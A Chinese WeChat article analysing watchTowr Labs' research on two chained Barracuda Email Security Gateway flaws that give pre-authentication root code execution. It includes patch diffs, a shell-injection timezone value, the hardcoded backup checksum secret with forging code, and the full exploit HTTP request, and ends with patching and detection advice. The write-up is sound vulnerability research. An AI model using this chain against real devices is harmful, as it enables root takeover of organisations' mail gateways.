---
title: 【微信】Barracuda ESG 预认证 Root RCE 拆解：一个 return 语句和一句硬编码密钥的故事
source: https://mp.weixin.qq.com/s/Zbzop1qpuHfFincDSl2sAA
source_host: mp.weixin.qq.com
clip_date: 2026-11-09T08:32:43+08:00
trace_id: d6868b08-d951-42a3-9a1a-1011287e4ef2
content_hash: ba8781fd27fa2c1ea5526857e01659a528dcf4c2ee12a49a426cdbde17bb61ee
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 41375244-d011-8107-9f9c-f42462027793
ioc:
  cves:
    - CVE-2023-2868
    - CVE-2026-111560
    - CVE-2026-116606
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

**幻泉之洲** *2026年11月8日 10:28*

> watchTowr Labs 拆了 Barracuda Email Security Gateway 的两个新漏洞：CVE-2026-116606（预认证授权绕过）和 CVE-2026-111560（OS 命令注入）。单看都不算致命，串起来就是一条完整的预认证 root 远程代码执行链。根因很朴素——一个该 bailout 的地方写了 return $userrole，以及一个写死在代码里的 md5 校验密钥。

Barracuda 的 Email Security Gateway（ESG）这几年在安全圈的存在感不低。它站在组织邮件系统最前面，决定哪封信是垃圾、哪封带毒、哪封放行。另一重身份则没那么体面：2023 年 UNC4841 组织拿 CVE-2023-2868 打零日，最后逼得一批客户把机架上的设备物理换掉。

不管你是哪种记忆，这台设备的共同点是：它在边界上，它检查一切流量，它跑着的权限恰好足够拦住一封骂你的邮件——也恰好足够在被打穿之后做很多别的事。

## 两个 CVE：单独看"不理想"，串起来"还行"

Barracuda 自己的公告把两个漏洞列得很清楚：

| CVE | 类型  | CVSS | 影响产品 | 修复版本 |
| --- | --- | --- | --- | --- |
| CVE-2026-116606 | 预认证授权绕过 | 9.3 严重 | Barracuda ESG | 9.4.0.029 |
| CVE-2026-111560 | OS 命令注入 | 8.6 高危 | ESG、负载均衡 ADC、Message Archiver、WAF Control Center、Web 应用防火墙、Web Security Gateway | 9.4.0.029 |

用英式说法，单独拎出任何一个都算"不太理想"。要是把两个串起来用，那就只能说"还行"。这话已经够刻薄了。

分析基于两个版本对比：有漏洞的 9.4.0.027，和修好的 9.4.0.029。Barracuda 为这两个 CVE 发了好几个补丁文件，本文重点看其中两个——针对授权绕过的 Patch-1，和针对命令注入的 Patch-2。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/22419dc76bf42029.png)

说句题外话，看到因为一个漏洞就要把机架服务器物理"驱魔"的往事，心里还是有点暖的（当然，我们知道故事远不止这么简单）。

## 漏洞一：一个 return 语句引发的授权绕过（CVE-2026-116606）

Patch-1 的安装脚本倒是很诚实，开头就写明了来意：

..snip..  
\# Pre-authentication authorization bypass permits  
\# arbitrary Spam_Config restore  
\# CVSS 9.8 Critical

眼尖的人会注意到，这里的 CVSS 写的是 9.8，而官方公告写 9.3。合理猜测是 9.8 把两个漏洞合并打了一个分——CVSS 专家看到这种操作大概会血压上升——而不是另有隐情。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b5af58ef831f3f74.png)

补丁改动涉及几个文件：Index.pm、Backup2.pm、bayesian_upload.pm、UserRole.pm、Params.pm。嫌疑名单不长，很快就锁定了 Index.pm。

Barracuda 在补丁里留了一句相当直白的注释：

\+ # Send the error and stop here. Returning a userrole  
\+ # would let response() run module handlers.

翻译成人话：这里必须发错误然后停住，一旦返回 userrole，response() 就会继续跑后面的模块处理器。

看看补丁前后的差别：

if ($password_change_status ==  
$Login::status_codes{ERROR_PASSWD_CHANGE}->{val}) {  
\- $params->{json_authenticate} = {  
\+ $self->audit("failed_password_change", $params->{user});  
\+ # Send the error and stop here. Returning a userrole  
\+ # would let response() run module handlers.  
\+ return $self->\_bailout_with_json_login_response(  
\+ $env, $params, {  
success => 'true',  
message => $Login::status_codes{ERROR_PASSWD_CHANGE}->{msg}  
. ": ". $message,  
status => $Login::status_codes{ERROR_PASSWD_CHANGE}->{val},  
\- };  
\- return $userrole;  
\+ });  
}

问题出在旧代码的这段逻辑上。密码修改失败、返回 ERROR_PASSWD_CHANGE 的时候，代码只是拼了一个 JSON 响应塞进 $params，然后 `return $userrole;` 就完事了。

对比一下正常路径：密码修改成功时，第 396 行走的是 `return bailout();`。bailout 是个明确信号——"到此为止，别往下走了"。

失败路径却只返回了 $userrole。这玩意儿就是当前会话的角色对象。对一个未认证的请求来说，它是登录页那个低权限角色。

低权限角色有什么好担心的？关键在于这段密码修改代码住在 `_process_params` 里，而调用它的是 `response` ：

584: sub response {  
585: my ($self, $env, $params) = @\_;  
586:  
587: $self->set_self_url($env, $params);  
588:  
589: # If we are not activated, this removes various changes the user may  
590: # have tried to make from the params hash.  
591: $self->\_check_activation($env, $params);  
592:  
593: $self->\_process_params($env, $params);  
594:  
595: $self->\_update_variables($env, $params);  
596:  
597: Barracuda::Hooks::run_hooks("after write config");

`_process_params` 在 593 行返回，把 $userrole 原样交给 response。这个返回没带任何错误标记，response 该干嘛干嘛，一路走到 `run_hooks` 。授权检查在这里形同虚设。

复现很直接。往 /cgi-mod/index.cgi 发一个 POST，带上 new_password 和 retype_password 两个参数：

POST /cgi-mod/index.cgi HTTP/1.1  
Host: barracuda.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 47  
  
user=admin&new_password=one&retype_password=two

设备返回 HTTP 200 和一段声明"密码修改失败"的 JSON：

{"message":"Error: Password Change: ","no_ajax_redirect":"true","redirect":"/cgi-mod/password_change.cgi?auth_type=Local&locale=en_US&user=admin&error=Error: Password Change: ","success":"true"}

到这里，你可能会问：被拒绝的认证操作，总该拦住后面的特权操作吧？一个登录页角色能干什么？

答案是：单独确实干不了什么。所以我们需要在旁边再架一门炮。

## 漏洞二：sed 命令注入，单引号救不了你（CVE-2026-111560）

Patch-2 同样给了完整的 Perl 源码，省了不少事。两个文件跳出来：Backup2.pm 和 fix_tz.pl。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9ff15b71295bfce5.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cc464487547058be.png)

先看 Backup2.pm。补丁前只有这么几行：

if( -f "/home/product/code/config/tz" ) {  
my $system_timezone = Barracuda::Config::get('system_timezone');  
\`sed -i 's#TZ=.\*#TZ=$system\_timezone#' /home/product/code/config/tz\`;  
}

修完之后换成了纯 Perl 的读-改-写：

if( -f "/home/product/code/config/tz" ) {  
my $system_timezone = Barracuda::Config::get('system_timezone');  
\- \`sed -i 's#TZ=.\*#TZ=$system\_timezone#' /home/product/code/config/tz\`;  
\+ if ($system_timezone && -f "/usr/share/zoneinfo/$system_timezone") {  
\+ open my $in, '<',...;  
\+ close $in;  
\+ open my $out, '>', '/home/product/code/config/tz' or die $!;  
\+ for my $line (@lines) {  
\+ $line =~ s/^TZ=.\*/TZ=$system_timezone/ if $line =~ /^TZ=/;  
\+ print $out $line;  
\+ }  
\+ close $out;  
\+ } else {  
\+ warn "Skipping tz restore: invalid system_timezone='$system_timezone'\\n";  
\+ }  
}

这次改动透露了三件事。

第一，厂商终于把 system_timezone 当成不可信输入了，要求它必须对应 /usr/share/zoneinfo/ 下的真实文件才能使用。

第二，旧代码越过了 shell 边界。Perl 的反引号是命令替换，Perl 拼好一个字符串交给 shell 执行。值外面的单引号看着像防护，其实只是生成命令里的普通字符，不构成 Perl 层面的安全边界。

攻击者构造一个这样的值就能改写 shell 语法：

Region#';;#

第一个引号提前闭合了 sed 表达式，分号开启一条新命令，# 把后面全注释掉。

第三，也是最让人坐直的一点——函数名叫 `finalize_restore` 。这个名字暗示了怎么触发它。

fix_tz.pl 讲的是同一个故事。补丁前：

my $system_timezone = Barracuda::Config::get('system_timezone');  
exit if!$system_timezone;  
  
\`sed -i 's#ZONE=.\*#ZONE=$system\_timezone#' /etc/sysconfig/clock\`;

补丁加了一道闸门，然后同样用 Perl 读写替换掉 shell 调用：

+if (! -f "/usr/share/zoneinfo/$system_timezone") {  
\+ warn "Invalid timezone: $system_timezone\\n";  
\+ exit 1;  
+}

两个 sink：Backup2.pm 里的一个写产品时区文件，fix_tz.pl 里的一个写操作系统的时钟配置。同一个攻击者可控的输入，两条路都能到。

有人说低权限用户根本写不了这些文件。没错，但这是安全设备，情况不一样。看看调用方式：

if( -f "/home/product/code/firmware/current/bin/fix_tz.pl" ) {  
system('/usr/bin/sudo',  
'/home/product/code/firmware/current/bin/fix_tz.pl');  
}

sudo。这不是普通的命令注入，这是以 root 身份执行的命令注入。

## 把两块拼起来：从上传备份到 root 执行

接下来要找一条自然到达漏洞代码的路径。bayesian_upload.pm 这个上传处理器很合适：

53: bc_sub bayesian_upload_handler =>  
54: perm { 1 },  
55: web_params( \[param('user'), param('bayesian'), param('pu_bayesian_upload')\]),  
56: does {  
57: my $args = shift;  
58: return if(!defined($args->{'bayesian'}) || $ENV{REMOTE_USER} eq 'guest');  
...  
95: $ret = Barracuda::Backup2::restore_all($filename, %params);

函数很直白。参数齐了就能走到第 95 行，对用户提供的备份文件执行 `restore_all` 。

那备份文件长什么样？它是一个 tar 包，里面有个 backup.xml，列出各个部件的元信息。给 Spam_Config 做恢复的时候，设备会加载一小段 MySQL dump，把数据写回本地库。其中一行就是 system_timezone。

到这里思路就很清楚了。把 system_timezone 的值改成：

UTC#';touch /tmp/watchTowr;#

恢复流程最终会调 `finalize_restore` ，反引号里的 sed 命令被拼出来，shell 执行 touch。以 root 身份。

但先别急，一个合法的备份文件还没造出来。

## 那个"最好的朋友"：硬编码校验和密钥

backup.xml 里每个文件都带校验和，restore 流程会老老实实重新计算一遍，对不上就拒绝。随手填个随机数这招行不通。

但校验算法的构造很有意思：

CHECKSUM_SECRET = b"Barracuda Networks is your new best friend"  
checksum = md5(file_bytes + CHECKSUM_SECRET + b".")

所谓"密钥"，就是一句硬编码在代码里的字符串——Barracuda Networks is your new best friend。这句台词成了本文标题的由来。有了它，校验和自己算就行：

47: mysql_dump = gzip.compress(sql, compresslevel=9, mtime=0)  
48: checksum = hashlib.md5(mysql_dump + CHECKSUM_SECRET + b".").hexdigest()  
49: timestamp = time.strftime("%Y%m%dT%H%M%S", time.gmtime())

校验和机制的设计初衷是防篡改，密钥硬编码在产品代码里，这层防护就只剩下"防止手滑"的作用了。

## 完整的利用请求

两个漏洞合起来，HTTP 请求本身反而简单得有点反高潮：

POST /cgi-mod/index.cgi HTTP/1.1  
Host: barracuda.com  
Content-Type: multipart/form-data; boundary=BOUNDARY  
  
\--BOUNDARY  
Content-Disposition: form-data; name="user"  
  
admin  
\--BOUNDARY  
Content-Disposition: form-data; name="new_password"  
  
one  
\--BOUNDARY  
Content-Disposition: form-data; name="retype_password"  
  
two  
\--BOUNDARY  
Content-Disposition: form-data; name="UPDATE_activation_code"  
  
1  
\--BOUNDARY  
Content-Disposition: form-data; name="pu_bayesian_upload"  
  
1  
\--BOUNDARY  
Content-Disposition: form-data; name="bayesian"; filename="poc.bak"  
Content-Type: application/octet-stream  
  
\--BOUNDARY--

密码修改失败触发授权绕过，请求继续往下走；同一请求里带上备份文件，走到 restore 流程；最终 root 命令执行。整个过程不需要任何有效凭据。

## 几点判断

这两个漏洞的组合不是偶然。授权绕过单独看，只是一个"该 bailout 却 return 了 userrole"的流程缺陷，CVSS 9.3 更多是给了"预认证"这三个字的面子。命令注入单独看，在需要认证的前提下危害有限。真正的问题在于，这两个缺陷在同一条请求处理链上，中间没有任何东西隔开。

更值得说的是根因。反引号 + 单引号包裹变量，这是 Perl 时代流传下来的经典错误，单引号在 shell 里是引号，在 Perl 里只是字符，两者不能混为一谈。而校验和密钥硬编码，则是产品安全设计上的通病：厂商把它当成"完整性校验"，但密钥随产品分发，攻击者拿到设备固件就能读到。这种防护只能防意外损坏，防不了有目标的攻击。

还有一点。Barracuda 在补丁注释里写得很明白——"Returning a userrole would let response() run module handlers"。说明开发人员知道这里会出问题，只是改之前没意识到后果有多重。安全设备的代码审查，尤其是涉及认证流程的分支返回，显然还需要更严格的标准。

边缘设备被打穿的代价从来不只是设备本身。它站在邮件入口，看得到所有流量，跑着 root，还常常和内部目录服务、管理网络连在一起。2023 年那次物理换机的教训，不该这么快被忘记。

## 检测与收尾

watchTowr 照例放出了 Detection Artefact Generator，用来判断自己的环境是否受影响，地址在 GitHub：watchtowrlabs/watchTowr-vs-Barracuda-RCE-CVE-2026-116606-CVE-2026-111560。

用 Barracuda ESG 的，升级到 9.4.0.029 或更高版本。同系列的 Load Balancer ADC、Message Archiver、WAF Control Center 等产品也在 CVE-2026-111560 的影响范围内，别只顾着邮件网关。

顺带说一句，那句"Barracuda Networks is your new best friend"，现在大概会被不少人拿来当段子讲了。

* * *

### 参考资料

\[1\] https://labs.watchtowr.com/barracuda-networks-is-your-new-best-friend-barracuda-email-security-gateway-pre-auth-remote-root-rce-cve-2026-116606-cve-2026-111560/
